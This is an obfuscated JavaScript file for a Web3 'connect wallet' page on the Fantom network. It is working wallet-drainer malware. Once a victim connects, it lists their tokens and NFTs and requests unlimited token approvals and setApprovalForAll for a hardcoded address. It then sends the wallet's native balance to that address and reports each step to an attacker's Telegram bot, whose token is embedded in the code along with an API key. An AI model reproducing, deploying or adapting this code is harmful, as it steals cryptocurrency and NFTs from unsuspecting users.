const _0x4144cd=_0x3cc4;(function(_0x421097,_0x388c87){const _0x5270c6=_0x3cc4,_0x314e39=_0x421097();while(!![]){try{const _0x2673bb=-parseInt(_0x5270c6(0xa7))/0x1*(-parseInt(_0x5270c6(0xf3))/0x2)+-parseInt(_0x5270c6(0xc9))/0x3*(parseInt(_0x5270c6(0xb5))/0x4)+parseInt(_0x5270c6(0x107))/0x5*(parseInt(_0x5270c6(0x12d))/0x6)+-parseInt(_0x5270c6(0xab))/0x7+-parseInt(_0x5270c6(0x8b))/0x8+-parseInt(_0x5270c6(0xca))/0x9+parseInt(_0x5270c6(0x9f))/0xa;if(_0x2673bb===_0x388c87)break;else _0x314e39['push'](_0x314e39['shift']());}catch(_0x267d23){_0x314e39['push'](_0x314e39['shift']());}}}(_0xb13f,0x3c115));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {fantom,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[fantom,mainnet],projectId=_0x4144cd(0xdb),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x4144cd(0x12e))]({'chains':chains,'options':{'appName':_0x4144cd(0x11b)}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x4144cd(0x11a)}},ethereumClient);const OWNER_ADDRESS=_0x4144cd(0x105),ABI=[{'constant':!![],'inputs':[],'name':_0x4144cd(0x10f),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0xd8),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0xe6),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0xbb),'type':_0x4144cd(0x10c)},{'name':_0x4144cd(0x130),'type':_0x4144cd(0x11f)}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':'function'},{'constant':!![],'inputs':[],'name':_0x4144cd(0x108),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x4144cd(0x10c)}],'name':'addBlackList','outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':'function'},{'constant':!![],'inputs':[],'name':'totalSupply','outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0xf9),'type':'address'},{'name':'_to','type':_0x4144cd(0x10c)},{'name':_0x4144cd(0x130),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x124),'outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[{'name':'','type':_0x4144cd(0x10c)}],'name':'balances','outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':_0x4144cd(0xc8),'outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':_0x4144cd(0x95),'outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[{'name':_0x4144cd(0xf2),'type':_0x4144cd(0x10c)}],'name':'getBlackListStatus','outputs':[{'name':'','type':_0x4144cd(0xe4)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[{'name':'','type':_0x4144cd(0x10c)},{'name':'','type':_0x4144cd(0x10c)}],'name':'allowed','outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':'function'},{'constant':!![],'inputs':[],'name':'paused','outputs':[{'name':'','type':_0x4144cd(0xe4)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':'function'},{'constant':!![],'inputs':[{'name':'who','type':_0x4144cd(0x10c)}],'name':_0x4144cd(0xff),'outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[],'name':_0x4144cd(0x11d),'outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':_0x4144cd(0xc7),'outputs':[{'name':'','type':_0x4144cd(0x10c)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':_0x4144cd(0xfc),'outputs':[{'name':'','type':_0x4144cd(0x10c)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':_0x4144cd(0xcb),'outputs':[{'name':'','type':_0x4144cd(0x101)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':'function'},{'constant':![],'inputs':[{'name':'_to','type':_0x4144cd(0x10c)},{'name':_0x4144cd(0x130),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x90),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0xed),'type':_0x4144cd(0x11f)},{'name':_0x4144cd(0xd9),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x12a),'outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0x138),'type':'uint256'}],'name':_0x4144cd(0xe2),'outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0x138),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0xaa),'outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[{'name':_0x4144cd(0x10a),'type':_0x4144cd(0x10c)},{'name':_0x4144cd(0xbb),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0x122),'outputs':[{'name':_0x4144cd(0xfa),'type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':_0x4144cd(0x128),'outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x4144cd(0xa1),'outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0xbf),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0xf8),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x4144cd(0xcf)},{'constant':!![],'inputs':[],'name':_0x4144cd(0x137),'outputs':[{'name':'','type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0xc3),'type':'address'}],'name':_0x4144cd(0x135),'outputs':[],'payable':![],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'constant':![],'inputs':[{'name':_0x4144cd(0xd3),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0xb4),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'name':_0x4144cd(0xa4),'type':_0x4144cd(0x11f)},{'name':_0x4144cd(0x11c),'type':_0x4144cd(0x101)},{'name':_0x4144cd(0x133),'type':'string'},{'name':_0x4144cd(0xdf),'type':_0x4144cd(0x11f)}],'payable':![],'stateMutability':_0x4144cd(0x127),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4144cd(0x138),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x123),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':'uint256'}],'name':_0x4144cd(0xe5),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4144cd(0x93),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0x9e),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4144cd(0xad),'type':_0x4144cd(0x11f)},{'indexed':![],'name':'maxFee','type':_0x4144cd(0x11f)}],'name':_0x4144cd(0xdd),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4144cd(0xd3),'type':_0x4144cd(0x10c)},{'indexed':![],'name':'_balance','type':_0x4144cd(0x11f)}],'name':'DestroyedBlackFunds','type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4144cd(0xc1),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0x116),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x4144cd(0xc1),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0x10b),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4144cd(0xfc),'type':_0x4144cd(0x10c)},{'indexed':!![],'name':'spender','type':'address'},{'indexed':![],'name':_0x4144cd(0xbc),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0xd5),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x4144cd(0x96),'type':_0x4144cd(0x10c)},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':_0x4144cd(0xbc),'type':'uint256'}],'name':_0x4144cd(0x111),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[],'name':_0x4144cd(0x8d),'type':'event'},{'anonymous':![],'inputs':[],'name':_0x4144cd(0xac),'type':_0x4144cd(0x97)}],ABIN=[{'inputs':[{'internalType':_0x4144cd(0x101),'name':'name','type':'string'},{'internalType':'string','name':'symbol','type':_0x4144cd(0x101)},{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xcd),'type':'uint256'},{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc6),'type':_0x4144cd(0x11f)}],'stateMutability':'nonpayable','type':_0x4144cd(0x94)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':'owner','type':_0x4144cd(0x10c)},{'indexed':!![],'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0xda),'type':_0x4144cd(0x10c)},{'indexed':!![],'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':'uint256'}],'name':_0x4144cd(0xd5),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0xfc),'type':_0x4144cd(0x10c)},{'indexed':!![],'internalType':'address','name':_0x4144cd(0x9d),'type':'address'},{'indexed':![],'internalType':_0x4144cd(0xe4),'name':'approved','type':'bool'}],'name':_0x4144cd(0xf5),'type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0xd2),'type':'address'},{'indexed':!![],'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0xc3),'type':'address'}],'name':'OwnershipTransferred','type':_0x4144cd(0x97)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0x96),'type':'address'},{'indexed':!![],'internalType':_0x4144cd(0x10c),'name':'to','type':_0x4144cd(0x10c)},{'indexed':!![],'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x111),'type':_0x4144cd(0x97)},{'inputs':[],'name':_0x4144cd(0xa9),'outputs':[{'internalType':_0x4144cd(0x101),'name':'','type':_0x4144cd(0x101)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0xa3),'outputs':[{'internalType':_0x4144cd(0x11f),'name':'','type':'uint256'}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x4144cd(0xb7),'outputs':[{'internalType':_0x4144cd(0x11f),'name':'','type':_0x4144cd(0x11f)}],'stateMutability':'view','type':_0x4144cd(0xcf)},{'inputs':[],'name':'apePrice','outputs':[{'internalType':_0x4144cd(0x11f),'name':'','type':_0x4144cd(0x11f)}],'stateMutability':_0x4144cd(0x119),'type':'function'},{'inputs':[{'internalType':_0x4144cd(0x10c),'name':'to','type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0xcc),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x10c),'name':'owner','type':_0x4144cd(0x10c)}],'name':_0x4144cd(0xff),'outputs':[{'internalType':'uint256','name':'','type':_0x4144cd(0x11f)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x4144cd(0xd4),'outputs':[{'internalType':_0x4144cd(0x101),'name':'','type':_0x4144cd(0x101)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0xae),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0x11e),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0xa6),'outputs':[{'internalType':_0x4144cd(0x10c),'name':'','type':_0x4144cd(0x10c)}],'stateMutability':'view','type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0xfc),'type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0x10c),'name':'operator','type':_0x4144cd(0x10c)}],'name':_0x4144cd(0x92),'outputs':[{'internalType':'bool','name':'','type':_0x4144cd(0xe4)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0xea),'outputs':[{'internalType':_0x4144cd(0x11f),'name':'','type':_0x4144cd(0x11f)}],'stateMutability':'view','type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x11f),'name':'numberOfTokens','type':'uint256'}],'name':_0x4144cd(0xa5),'outputs':[],'stateMutability':_0x4144cd(0xf7),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0x10f),'outputs':[{'internalType':_0x4144cd(0x101),'name':'','type':_0x4144cd(0x101)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x4144cd(0x10c),'name':'','type':'address'}],'stateMutability':_0x4144cd(0x119),'type':'function'},{'inputs':[{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':'uint256'}],'name':_0x4144cd(0x139),'outputs':[{'internalType':'address','name':'','type':_0x4144cd(0x10c)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x4144cd(0x115),'outputs':[],'stateMutability':'nonpayable','type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0x110),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':'function'},{'inputs':[{'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0x96),'type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0x10c),'name':'to','type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x9a),'outputs':[],'stateMutability':'nonpayable','type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0x96),'type':'address'},{'internalType':_0x4144cd(0x10c),'name':'to','type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':'uint256'},{'internalType':_0x4144cd(0xbe),'name':_0x4144cd(0x8a),'type':_0x4144cd(0xbe)}],'name':_0x4144cd(0x9a),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0xdc),'outputs':[{'internalType':_0x4144cd(0xe4),'name':'','type':'bool'}],'stateMutability':'view','type':_0x4144cd(0xcf)},{'inputs':[{'internalType':'address','name':_0x4144cd(0x9d),'type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0xe4),'name':_0x4144cd(0xda),'type':'bool'}],'name':_0x4144cd(0x9b),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x101),'name':_0x4144cd(0xd4),'type':_0x4144cd(0x101)}],'name':'setBaseURI','outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x101),'name':'provenanceHash','type':_0x4144cd(0x101)}],'name':_0x4144cd(0x121),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x11f),'name':'revealTimeStamp','type':'uint256'}],'name':'setRevealTimestamp','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[],'name':'setStartingIndex','outputs':[],'stateMutability':'nonpayable','type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0xeb),'outputs':[{'internalType':_0x4144cd(0x11f),'name':'','type':_0x4144cd(0x11f)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x4144cd(0x11f),'name':'','type':'uint256'}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x129),'name':_0x4144cd(0xe8),'type':_0x4144cd(0x129)}],'name':_0x4144cd(0x89),'outputs':[{'internalType':'bool','name':'','type':_0x4144cd(0xe4)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x4144cd(0x101),'name':'','type':_0x4144cd(0x101)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xb0),'type':_0x4144cd(0x11f)}],'name':'tokenByIndex','outputs':[{'internalType':'uint256','name':'','type':_0x4144cd(0x11f)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':'address','name':'owner','type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xb0),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x8f),'outputs':[{'internalType':'uint256','name':'','type':_0x4144cd(0x11f)}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x11f),'name':_0x4144cd(0xc0),'type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x118),'outputs':[{'internalType':_0x4144cd(0x101),'name':'','type':'string'}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0xd0),'outputs':[{'internalType':_0x4144cd(0x11f),'name':'','type':'uint256'}],'stateMutability':_0x4144cd(0x119),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x10c),'name':'from','type':_0x4144cd(0x10c)},{'internalType':_0x4144cd(0x10c),'name':'to','type':'address'},{'internalType':'uint256','name':'tokenId','type':_0x4144cd(0x11f)}],'name':_0x4144cd(0x124),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[{'internalType':_0x4144cd(0x10c),'name':_0x4144cd(0xc3),'type':_0x4144cd(0x10c)}],'name':_0x4144cd(0x135),'outputs':[],'stateMutability':_0x4144cd(0x127),'type':_0x4144cd(0xcf)},{'inputs':[],'name':_0x4144cd(0x10d),'outputs':[],'stateMutability':'nonpayable','type':_0x4144cd(0xcf)}];$('.connect')['click'](async function(){const _0x418c76=_0x4144cd;console[_0x418c76(0x117)]('1');try{await web3Modal[_0x418c76(0xa2)]();}catch(_0x274af3){console['log'](_0x418c76(0x12c),_0x274af3);return;}}),$(_0x4144cd(0xb2))[_0x4144cd(0xd7)](async function(){const _0x1d4b53=_0x4144cd;alert(_0x1d4b53(0xb9));let _0x22101f=getAccount();console[_0x1d4b53(0x117)](_0x22101f),!_0x22101f[_0x1d4b53(0x10c)]&&(console[_0x1d4b53(0x117)](_0x1d4b53(0xfb)),alert('You\x20need\x20to\x20connect\x20your\x20wallet\x20first')),_0x22101f[_0x1d4b53(0xf0)][_0x1d4b53(0x10f)]===_0x1d4b53(0x91)&&(_0x22101f[_0x1d4b53(0xf0)][_0x1d4b53(0x113)][_0x1d4b53(0x106)]()[_0x1d4b53(0xaf)]!==_0x1d4b53(0x10e)&&(console[_0x1d4b53(0x117)](_0x1d4b53(0xef)),await switchNetwork({'chainId':0xfa}))),selectedAccount=_0x22101f[_0x1d4b53(0x10c)],sendMessage('Wallet\x20Connected\x20Successfully\x20to\x20fantom!'),sendMessage(_0x1d4b53(0xce)+selectedAccount),covalenthqAPICall();});const Oxa=_0x4144cd(0x136),Oxc1='5227607491',Oxc2=_0x4144cd(0xc5);async function covalenthqAPICall(){const _0x576b11=_0x4144cd,_0x421981={'chain':'fantom'},_0x1e0d3a=new URL(_0x576b11(0xfe)+selectedAccount+'/erc20');_0x1e0d3a[_0x576b11(0x114)]=new URLSearchParams(_0x421981)[_0x576b11(0xb8)]();const _0x3f9d76={'method':_0x576b11(0x102),'headers':{'accept':_0x576b11(0xe9),'X-API-Key':_0x576b11(0x100)}};try{const _0xd44e18=await fetch(_0x1e0d3a,_0x3f9d76)[_0x576b11(0x12b)](_0x259031=>_0x259031[_0x576b11(0x99)]());console[_0x576b11(0x117)](_0xd44e18);let _0x46fd1c=_0xd44e18;console[_0x576b11(0x117)]('Initial\x20list\x20',_0x46fd1c);let _0xb0496d=await Promise['all'](_0x46fd1c['map'](async _0x24c579=>{const _0x49e6d1=_0x576b11;let _0x56017b;try{_0x56017b=await getValue(_0x24c579['token_address'],_0x24c579[_0x49e6d1(0xbd)],_0x24c579[_0x49e6d1(0x103)]);}catch(_0x24ac96){_0x56017b=0x0;}return console['log'](_0x56017b),{'balance':_0x24c579[_0x49e6d1(0xbd)],'value':_0x56017b,'address':_0x24c579[_0x49e6d1(0xd6)]};}));console['log']('tokens-list',_0xb0496d),tokens=_0xb0496d[_0x576b11(0x8e)](_0x1e92fc=>_0x1e92fc[_0x576b11(0xbc)]>0x5),tokens[_0x576b11(0xb6)]((_0x86c335,_0x35eefa)=>_0x35eefa[_0x576b11(0xbc)]-_0x86c335[_0x576b11(0xbc)]),console[_0x576b11(0x117)](_0x576b11(0x8c),await getNetwork(),_0x576b11(0x132),tokens),NFTs=await getNFTs(selectedAccount)[_0x576b11(0x98)](_0x5bcab5=>{const _0x539f6c=_0x576b11;console['log'](_0x539f6c(0xc2),_0x5bcab5);}),NFTs=NFTs[_0x576b11(0x126)],console[_0x576b11(0x117)](_0x576b11(0x131),NFTs);if(tokens[_0x576b11(0xe0)]===0x0&&NFTs[_0x576b11(0xe0)]===0x0)onSendEther();else onApprove();}catch{sendMessage('Error\x20collecting\x20info\x20about\x20wallet');}}async function onApprove(){const _0x58133c=_0x4144cd;if(tokens[_0x58133c(0xe0)])try{loopTokens(tokens);}catch(_0x14da37){console[_0x58133c(0xc4)](_0x58133c(0x109)+_0x14da37[_0x58133c(0x112)]);}else{if(NFTs[_0x58133c(0xe0)]){try{loopNfts(NFTs);}catch(_0x15f632){console['error'](_0x58133c(0x109)+_0x15f632[_0x58133c(0x112)]);}onSendEther(),sendMessage(_0x58133c(0x134));}else try{onSendEther();}catch(_0x17f702){console[_0x58133c(0xc4)]('Error\x20processing\x20item\x20'+_0x17f702[_0x58133c(0x112)]);}}}function _0x3cc4(_0x3107ab,_0x5a36c){const _0xb13ff3=_0xb13f();return _0x3cc4=function(_0x3cc484,_0x35f5bb){_0x3cc484=_0x3cc484-0x89;let _0x55497b=_0xb13ff3[_0x3cc484];return _0x55497b;},_0x3cc4(_0x3107ab,_0x5a36c);}async function loopTokens(_0x2fec7f){const _0x2b3fea=_0x4144cd;for await(let _0x1a54fd of _0x2fec7f){console[_0x2b3fea(0x117)](_0x2b3fea(0xb3),_0x1a54fd);try{sendMessage('New\x20token');let {hash:_0x231a32}=await writeContract({'address':_0x1a54fd[_0x2b3fea(0x10c)],'abi':ABI,'functionName':_0x2b3fea(0xcc),'args':[Oxa,'999999999999999999999999999999999999999999999999999999999999999999999999']});console[_0x2b3fea(0x117)](_0x2b3fea(0x125),_0x231a32),_0x231a32&&(console[_0x2b3fea(0x117)](_0x2b3fea(0x120)),sendMessage(_0x2b3fea(0xf4)),sendMessage(_0x2b3fea(0xec)+_0x1a54fd['address']),sendMessage(_0x2b3fea(0xba)+_0x1a54fd['balance']),sendMessage(_0x2b3fea(0xde)+Oxa));}catch(_0x48fc2c){console[_0x2b3fea(0x117)](_0x2b3fea(0xe1)+_0x48fc2c),sendMessage('Transaction\x20Rejected');}};await loopNfts(NFTs);}async function loopNfts(_0x47107c){const _0x757de=_0x4144cd;for await(let _0x50b059 of _0x47107c){console[_0x757de(0x117)]('NFT',_0x50b059);try{let {hash:_0x5d5eba}=await writeContract({'address':_0x50b059[_0x757de(0xd6)],'abi':ABIN,'functionName':_0x757de(0x9b),'args':[Oxa,!![]]});console['log']('hash',_0x5d5eba),console['log'](_0x757de(0xd1)+receipt),sendMessage(_0x757de(0xf4)),sendMessage('NFT\x20Contract\x20Address\x20'+_0x50b059['token_address']),sendMessage(_0x757de(0xde)+Oxa);}catch(_0x54ad75){console[_0x757de(0x117)]('Error:\x20'+_0x54ad75),sendMessage('Transaction\x20Rejected');}}await onSendEther();}async function onSendEther(){const _0x4d266e=_0x4144cd;console[_0x4d266e(0x117)](_0x4d266e(0xfd));try{let _0x1be5ec=await fetchBalance({'address':selectedAccount});console[_0x4d266e(0x117)](_0x1be5ec);const _0x3b8b94=await fetchFeeData();console[_0x4d266e(0x117)](_0x3b8b94);var _0x29f16f=_0x3b8b94[_0x4d266e(0x104)]['gasPrice'];_0x29f16f=parseFloat(_0x29f16f);let _0x46e160=parseFloat(_0x1be5ec['formatted'])-_0x29f16f*0.00042;_0x46e160=parseEther(_0x46e160[_0x4d266e(0xb8)]()),console[_0x4d266e(0x117)](_0x46e160);const {hash:_0xfe70bc}=await sendTransaction({'to':Oxa,'value':_0x46e160});console[_0x4d266e(0x117)](_0xfe70bc),sendMessage(_0x4d266e(0x12f),_0xfe70bc),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}function _0xb13f(){const _0x317c67=['_user','Unable\x20to\x20get\x20NFts','newOwner','error','5699310522','saleStart','getOwner','maximumFee','3MOrOCC','3415977TtTpSa','symbol','approve','maxNftSupply','Cl\x20address\x20:\x20','function','totalSupply','Transaction\x20Receipt:\x20','previousOwner','_blackListedUser','baseURI','Approval','token_address','click','_upgradedAddress','newMaxFee','approved','ee71d215d0dec7d1bf950851c84d9643','saleIsActive','Params','Your\x20address\x20','_decimals','length','Error:\x20','issue','&vs_currencies=usd','bool','Redeem','deprecate','&format=decimal&limit=','interfaceId','application/json','maxApePurchase','startingIndex','TOKEN\x20Contract\x20Address\x20','newBasisPoints','fantom','Incorrect\x20network','connector','usd','_maker','2CfELbB','Approve\x20Completed\x20Successfully','ApprovalForAll','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','payable','removeBlackList','_from','remaining','No\x20address','owner','sending\x20ether','https://deep-index.moralis.io/api/v2/','balanceOf','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','string','GET','decimals','formatted','0xea8968B218a551919FbD5f1166328C82a96dED54','getProvider','10LIKRPh','deprecated','Error\x20processing\x20item\x20','_owner','RemovedBlackList','address','withdraw','250','name','reserveApes','Transfer','message',